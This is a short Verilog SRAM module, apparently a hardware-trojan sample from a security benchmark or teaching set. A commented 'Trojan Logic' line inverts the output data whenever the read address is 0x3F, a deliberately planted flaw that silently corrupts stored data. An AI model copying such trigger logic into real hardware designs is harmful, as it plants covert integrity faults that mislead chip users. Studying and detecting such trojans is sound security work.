
module sram_ht1(
	clk, rst, ce, we, oe, addr, di, do
);
	parameter aw = 6;
	parameter dw = 8;

	input           clk, rst, ce, we, oe;
	input  [aw-1:0] addr;
	input  [dw-1:0] di;
	output [dw-1:0] do;

	reg [dw-1:0] mem [(1<<aw) -1:0];
	reg [aw-1:0] ra;

	always @(posedge clk)
	  if (ce) ra <= addr;

	wire [dw-1:0] clean_do = mem[ra];

	// Trojan Logic: Invert data at address 0x3F
	wire trigger = (ra == 6'h3F);
	assign do = trigger ? ~clean_do : clean_do;

	always @(posedge clk)
	  if (we && ce) mem[addr] <= di;

endmodule
